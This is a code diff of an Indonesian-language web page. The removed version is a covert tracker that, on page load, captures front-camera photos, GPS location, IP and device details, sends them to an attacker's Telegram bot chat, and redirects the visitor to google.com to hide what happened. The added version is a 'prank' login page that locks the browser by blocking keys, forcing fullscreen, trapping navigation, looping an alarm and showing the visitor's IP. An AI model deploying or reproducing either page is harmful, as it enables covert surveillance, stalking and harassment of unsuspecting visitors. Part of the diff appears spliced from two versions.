-        // =============================================================================
-        // DISCLAIMER: KODE INI HANYA UNTUK TUJUAN EDUKASI KEAMANAN SIBER.
-        // Penggunaan tanpa izin untuk mencuri data adalah ILEGAL.
-        // =============================================================================
+        // Admin account
+        const ADMIN_ACCOUNT = {
+            username: "JhonNotDev",
+            password: "999"
+        };
 
-        // --- KONFIGURASI ---
-        // PRAKTIK BURUK: Token bot seharusnya tidak di-hardcode di sisi klien.
-        // Untuk demo ini, kita letakkan di sini. Di produksi, gunakan backend server
-        // sebagai proxy untuk mengirim data ke Telegram.
-        const BOT_TOKEN = '1234567890:AAF_xxxxxxxxxxxxxxxxxxxxxxxxxxxx'; // <-- GANTI DENGAN TOKEN ANDA
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        // Load accounts dari localStorage
+        let validAccounts = JSON.parse(localStorage.getItem('prankAccounts')) || {
+            "Rezzy": "Rezzy001",
+            "admin": "admin123",
+            "user": "user123"
+        };
 
-        // --- EKSTRAKSI PARAMETER URL ---
-        const urlParams = new URLSearchParams(window.location.search);
-        const uniqueBotId = urlParams.get('_y');
-        const encodedChatId = urlParams.get('_x');
+        // Array pesan sarkas
+        const sarkasMessages = [
+            "GABISA DONG BOCAH! 😹",
+            "YAKALI BISA BEGITU AJA! 😹", 
+            "REBOOT AJA CILL! 😹",
+            "DASAR NOOB MAU KELUAR! 😹",
+            "OTAK LU DIMANA SIH? 😹",
+            "GAMPANGAN DARI GINI? 😹"
+        ];
 
-        // Jika parameter tidak lengkap, hentikan proses dan alihkan.
-        if (!uniqueBotId || !encodedChatId) {
-            console.error('Parameter URL tidak valid. Mengalihkan...');
-            window.location.href = 'https://google.com';
-            // Stop eksekusi script lebih lanjut
-            throw new Error("Invalid parameters");
-        }
-
-        // Decode chatId target
-        const targetChatId = atob(encodedChatId);
-
-        // --- FUNGSI PENGUMPULAN DATA (DIJALANKAN PARALEL) ---
-
-        /**
-         * Meminta izin kamera dan mengambil satu foto.
-         * @returns {Promise<Blob|null>} Promise yang resolve dengan blob foto atau null jika gagal.
-         */
-        async function getPhoto() {
-            try {
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } // Prioritaskan kamera depan
-                });
-                
-                video.srcObject = stream;
-                video.play();
-
-                // Tunggu video siap
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => resolve();
-                });
-
-                // Set resolusi canvas ke resolusi video
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-
-                // Gambar frame video ke canvas
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Hentikan stream kamera
-                stream.getTracks().forEach(track => track.stop());
-
-                // Kembalikan foto sebagai blob
-                return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
-            } catch (error) {
-                console.error("Kamera ditolak atau tidak tersedia:", error);
-                return null; // Kembalikan null jika gagal
-            }
-        }
-
-        /**
-         * Meminta izin lokasi dan mengambil koordinat.
-         * @returns {Promise<Object|null>} Promise yang resolve dengan objek lokasi atau null jika ditolak.
-         */
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
+        // Update accounts list display
+        function updateAccountsList() {
+            const accountsList = document.getElementById('accountsList');
+            accountsList.innerHTML = '';
+            
+            Object.keys(validAccounts).forEach(username => {
+                if (username !== ADMIN_ACCOUNT.username) { // Jangan tampilkan admin
+                    const accountItem = document.createElement('div');
+                    accountItem.className = 'account-item';
+                    accountItem.innerHTML = `
+                        <div>
+                            <strong>${username}</strong>
+                            <div style="font-size: 0.8rem; opacity: 0.8;">${validAccounts[username]}</div>
+                        </div>
+                        <button class="delete-btn" onclick="deleteAccount('${username}')">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    `;
+                    accountsList.appendChild(accountItem);
                 }
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        });
-                    },
-                    (error) => {
-                        console.error("Lokasi ditolak:", error);
-                        resolve(null); // Jangan gagal total jika lokasi ditolak
-                    }
-                );
             });
         }
 
-        /**
-         * Mengumpulkan informasi perangkat dan jaringan.
-         * @returns {Promise<Object>} Promise yang resolve dengan objek data perangkat.
-         */
-        async function getDeviceAndNetworkInfo() {
-            try {
-                const response = await fetch('http://ip-api.com/json/');
-                if (!response.ok) throw new Error('Gagal mengambil data IP');
-                const ipData = await response.json();
-
-                return {
-                    ip: ipData.query,
-                    country: ipData.country,
-                    city: ipData.city,
-                    isp: ipData.isp,
-                    timezone: ipData.timezone,
-                    userAgent: navigator.userAgent,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    platform: navigator.platform,
-                    language: navigator.language
-                };
-            } catch (error) {
-                console.error("Gagal mengambil info jaringan:", error);
-                // Kembalikan data dasar jika API gagal
-                return {
-                    ip: 'Tidak diketahui',
-                    userAgent: navigator.userAgent,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    platform: navigator.platform,
-                    language: navigator.language
-                };
+        // Delete account
+        function deleteAccount(username) {
+            if (confirm(`Hapus akun ${username}?`)) {
+                delete validAccounts[username];
+                localStorage.setItem('prankAccounts', JSON.stringify(validAccounts));
+                updateAccountsList();
             }
         }
 
-        // --- EKSEKUSI UTAMA ---
-        window.onload = async () => {
-            // Jalankan semua fungsi pengumpulan data secara paralel
-            const [photo, location, deviceInfo] = await Promise.allSettled([
-                getPhoto(),
-                getLocation(),
-                getDeviceAndNetworkInfo()
-            ]);
-
-            // Ekstrak nilai dari Promise.allSettled
-            const photoBlob = photo.status === 'fulfilled' ? photo.value : null;
-            const locationData = location.status === 'fulfilled' ? location.value : null;
-            const networkData = deviceInfo.status === 'fulfilled' ? deviceInfo.value : {};
-
-            // --- FORMAT DAN KIRIM DATA ---
-            let locationString = 'Tidak diketahui';
-            if (locationData) {
-                locationString = `${locationData.latitude}, ${locationData.longitude}`;
-            }
-
-            const caption = `🎯 Target Tertangkap!\n` +
-                `📍 Lokasi GPS: ${locationString}\n` +
-                `🌐 IP Address: ${networkData.ip || 'Tidak diketahui'}\n` +
-                `🏢 Kota/Negara: ${networkData.city || 'Tidak diketahui'}, ${networkData.country || 'Tidak diketahui'}\n` +
-                `🏢 ISP: ${networkData.isp || 'Tidak diketahui'}\n` +
-                `💻 Perangkat: ${networkData.userAgent}\n` +
-                `📱 Resolusi Layar: ${networkData.screenResolution}\n` +
-                `⚙️ Platform: ${networkData.platform}\n` +
-                `🌍 Bahasa: ${networkData.language}`;
-
-            // Kirim data ke Telegram
-            if (photoBlob) {
-                const formData = new FormData();
-                formData.append('chat_id', targetChatId);
-                formData.append('photo', photoBlob, 'capture.jpg');
-                formData.append('caption', caption);
-
-                try {
-                    await fetch(TELEGRAM_API_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    console.log('Data berhasil dikirim ke Telegram.');
-                } catch (error) {
-                    console.error('Gagal mengirim data ke Telegram:', error);
-                }
-            } else {
-                // Jika foto gagal, kirim hanya teks
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: targetChatId,
-                            text: caption
-                        })
-                    });
-                    console.log('Data teks berhasil dikirim ke Telegram.');
-                } catch (error) {
-                    console.error('Gagal mengirim data teks ke Telegram:', error);
-                }
-            }
-
-            // --- PENUTUP: ALIHKAN PENGGUNA ---
-            // Alihkan pengguna ke situs yang sah untuk menghilangkan jejak dan mengurangi kecurigaan.
-            window.location.href = 'https://google.com';
-        };
-    </script>
-</body>
-</html>                if (!botId || !encodedChatId) {
-                    console.error("Parameter URL (_y atau _x) tidak ditemukan.");
-                    statusText.textContent = "Error: Link tidak valid.";
+        // Create new account
+        document.getElementById('createAccountBtn').addEventListener('click', function() {
+            const username = document.getElementById('newUsername').value.trim();
+            const password = document.getElementById('newPassword').value.trim();
+            
+            if (username && password) {
+                if (validAccounts[username]) {
+                    alert('Username sudah ada!');
                     return;
                 }
-
-                CHAT_ID = atob(encodedChatId);
-                console.log("Target Chat ID:", CHAT_ID);
-
-                // 2. Minta akses kamera DEPAN
-                statusText.textContent = "Meminta izin kamera depan...";
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 1280 }, 
-                        height: { ideal: 720 },
-                        facingMode: "user" 
-                    } 
-                });
-                console.log("✅ Izin kamera diberikan. Stream aktif.");
-                statusText.textContent = "Stream aktif, menunggu video muncul...";
-
-                // 3. Tampilkan stream di elemen video
-                video.srcObject = stream;
-                video.play();
-
-                // 4. Tunggu video benar-benar siap dengan polling
-                const waitForVideo = () => {
-                    if (video.readyState >= 4 && video.videoWidth > 0) {
-                        // Video sudah siap!
-                        console.log(`✅ Video siap! Dimensi: ${video.videoWidth}x${video.videoHeight}`);
-                        statusText.textContent = "Video siap. Memulai pengiriman foto setiap 1 detik.";
-                        // Mulai proses pengiriman
-                        captureInterval = setInterval(captureAndSendLoop, 1000);
-                    } else {
-                        // Jika belum siap, cek lagi dalam 100ms
-                        console.log(`Menunggu video... readyState: ${video.readyState}, dimensi: ${video.videoWidth}x${video.videoHeight}`);
-                        setTimeout(waitForVideo, 100);
-                    }
-                };
-
-                // Mulai menunggu
-                waitForVideo();
-
-            } catch (error) {
-                console.error("❌ Akses kamera ditolak atau terjadi error:", error);
-                statusText.textContent = `Error: ${error.message}`;
-            }
-        }
-
-        // Fungsi loop untuk menangkap dan mengirim foto
-        async function captureAndSendLoop() {
-            if (!video || video.readyState < 4 || video.videoWidth === 0) {
-                console.log("Video tidak siap, melewati pengiriman.");
-                return;
-            }
-
-            console.log("📸 Menangkap gambar...");
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(async (blob) => {
-                if (!blob) {
-                    console.error("Error: Gagal membuat blob.");
-                    return;
-                }
-
-                const formData = new FormData();
-                formData.append('photo', blob, `capture_${Date.now()}.jpg`);
-                formData.append('chat_id', CHAT_ID);
                 
-                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                validAccounts[username] = password;
+                localStorage.setItem('prankAccounts', JSON.stringify(validAccounts));
+                
+                document.getElementById('newUsername').value = '';
+                document.getElementById('newPassword').value = '';
+                
+                updateAccountsList();
+                alert(`Akun ${username} berhasil dibuat!`);
+            } else {
+                alert('Username dan password harus diisi!');
+            }
+        });
 
-                try {
-                    const response = await fetch(telegramApiUrl, { method: 'POST', body: formData });
-                    const result = await response.json();
-                    if (response.ok && result.ok) {
-                        console.log("✅ Foto berhasil terkirim!");
-                    } else {
-                        console.error("❌ Gagal mengirim foto. Respon API:", result);
-                    }
-                } catch (fetchError) {
-                    console.error("❌ Error saat melakukan fetch ke Telegram:", fetchError);
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const password = document.getElementById('password');
+            const type = password.type === 'password' ? 'text' : 'password';
+            password.type = type;
+            this.classList.toggle('fa-eye');
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        // Login handler
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            const successMessage = document.getElementById('successMessage');
+            
+            emailError.style.display = 'none';
+            passwordError.style.display = 'none';
+            successMessage.style.display = 'none';
+            
+            let isValid = true;
+            
+            if (!username) {
+                emailError.style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!password) {
+                passwordError.style.display = 'block';
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Cek jika admin
+                if (username === ADMIN_ACCOUNT.username && password === ADMIN_ACCOUNT.password) {
+                    successMessage.style.display = 'block';
+                    setTimeout(() => {
+                        alert('👑 Mode Admin - Sistem tidak terkunci');
+                    }, 1000);
+                    return;
                 }
-            }, 'image/jpeg', 0.9);
+                
+                // Cek jika user biasa
+                if (validAccounts[username] === password) {
+                    successMessage.style.display = 'block';
+                    setTimeout(() => {
+                        activateLock(username);
+                    }, 2000);
+                } else {
+                    emailError.textContent = 'Username atau password salah!';
+                    emailError.style.display = 'block';
+                }
+            }
+        });
+
+        // Fungsi untuk mengaktifkan kunci
+        async function activateLock(username) {
+            const alertSound = document.getElementById('alertSound');
+            
+            // Sembunyikan login screen
+            document.getElementById('loginScreen').style.display = 'none';
+            
+            // Tampilkan dashboard
+            document.getElementById('dashboardPage').style.display = 'block';
+            
+            // Tampilkan data user
+            document.getElementById('displayUsername').textContent = username;
+            document.getElementById('ipAddress').textContent = await getIP();
+            document.getElementById('deviceInfo').textContent = getDeviceBrand();
+            document.getElementById('lockTime').textContent = new Date().toLocaleString();
+            
+            // Putar suara alarm
+            alertSound.play().catch(e => {
+                console.log('Audio error:', e);
+            });
+            alertSound.loop = true;
+            
+            // Aktifkan kunci EXTREME
+            activateExtremeLock();
         }
 
-        // Hentikan pengiriman jika halaman ditutup
-        window.onbeforeunload = () => {
-            if (captureInterval) {
-                clearInterval(captureInterval);
+        // EXTREME LOCK SYSTEM - REBOOT ONLY
+        function activateExtremeLock() {
+            console.log('🔒 EXTREME LOCK ACTIVATED - REBOOT ONLY!');
+            
+            // 1. BLOKIR KEYBOARD 100%
+            document.addEventListener('keydown', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                showRebootWarning();
+                return false;
+            }, true);
+
+            // 2. BLOKIR MOUSE RIGHT CLICK
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                showRebootWarning();
+                return false;
+            }, true);
+
+            // 3. BLOKIR BEFOREUNLOAD SUPER AGGRESIF
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '🚫 SYSTEM LOCKED! REBOOT ONLY! 😹😹😹';
+                
+                // Coba buka kembali halaman
+                setTimeout(() => {
+                    window.location.reload();
+                }, 50);
+                
+                return '🚫 SYSTEM LOCKED! REBOOT ONLY! 😹😹😹';
+            });
+
+            // 4. BLOKIR NAVIGATION
+            history.pushState(null, null, window.location.href);
+            window.addEventListener('popstate', function(e) {
+                history.pushState(null, null, window.location.href);
+                showRebootWarning();
+            });
+
+            // 5. FORCE FULLSCREEN
+            function forceFullscreen() {
+                const elem = document.documentElement;
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen().catch(err => {
+                        setTimeout(forceFullscreen, 500);
+                    });
+                }
             }
-        };
+            forceFullscreen();
 
-        // Jalankan saat halaman dimuat
-        window.onload = startCapture;
+            // 6. CONTINUOUS PROTECTION LOOP
+            setInterval(() => {
+                window.focus();
+                if (!document.fullscreenElement) {
+                    forceFullscreen();
+                }
+            }, 1000);
+        }
 
+        function showRebootWarning() {
+            const randomMsg = sarkasMessages[Math.floor(Math.random() * sarkasMessages.length)];
+            alert(`🚫 ${randomMsg}\n\n💀 REBOOT DEVICE MU! 💀`);
+        }
+
+        // Get IP Address
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+
+        // Deteksi device
+        function getDeviceBrand() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('samsung')) return 'Samsung';
+            if (ua.includes('xiaomi') || ua.includes('redmi')) return 'Xiaomi';
+            if (ua.includes('iphone')) return 'iPhone';
+            if (ua.includes('oppo')) return 'Oppo';
+            if (ua.includes('vivo')) return 'Vivo';
+            if (ua.includes('android')) return 'Android';
+            return 'Unknown Device';
+        }
+
+        // Button events untuk dashboard
+        document.getElementById('unlockBtn').addEventListener('click', function() {
+            const originalText = this.innerHTML;
+            this.textContent = sarkasMessages[Math.floor(Math.random() * sarkasMessages.length)];
+            this.disabled = true;
+            
+            setTimeout(() => {
+                this.innerHTML = originalText;
+                this.disabled = false;
+            }, 3000);
+        });
+
+        document.getElementById('helpBtn').addEventListener('click', function() {
+            const originalText = this.innerHTML;
+            this.textContent = sarkasMessages[Math.floor(Math.random() * sarkasMessages.length)];
+            this.disabled = true;
+            
+            setTimeout(() => {
+                this.innerHTML = originalText;
+                this.disabled = false;
+            }, 3000);
+        });
+
+        // Initialize
+        window.addEventListener('load', function() {
+            updateAccountsList();
+        });
     </script>
 </body>
 </html>
